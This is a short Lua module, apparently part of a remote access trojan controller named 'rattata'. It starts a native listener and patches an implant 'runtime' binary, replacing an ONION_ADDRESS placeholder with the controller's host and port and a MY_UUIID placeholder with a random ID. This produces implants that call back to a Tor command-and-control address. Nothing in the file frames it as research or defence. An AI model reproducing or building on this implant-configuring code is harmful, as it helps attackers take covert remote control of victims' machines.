local ffi = require("ffi")

local f_rattata = ffi.load("rattata")

ffi.cdef[[
  const int8_t* rattata_start(uint16_t port);
]]

-- get a uuid
local function uuid()
    local template ='xxxxxxxx-xxxx-4xxx-yxxx-xxxxxxxxxxxx'
    return string.gsub(template, '[xy]', function (c)
        local v = (c == 'x') and math.random(0, 0xf) or math.random(8, 0xb)
        return string.format('%x', v)
    end)
end

local rattata = {}

-- given a platform's target runtime filename path, get the target runtime (as a string) for current manager instance
function rattata:runtime(runtime_filename, port)
  local fin = io.open(runtime_filename, "rb")
  local contents = fin:read("*all")
  fin:close()
  local c = contents:gsub("ONION_ADDRESS.............................................................", string.format("ONION_ADDRESS%-61s", string.format("%s:%d", self:hostname(), port)))
  return c:gsub("MY_UUIID....................................", string.format("MY_UUIID%s", uuid()))
end

return rattata
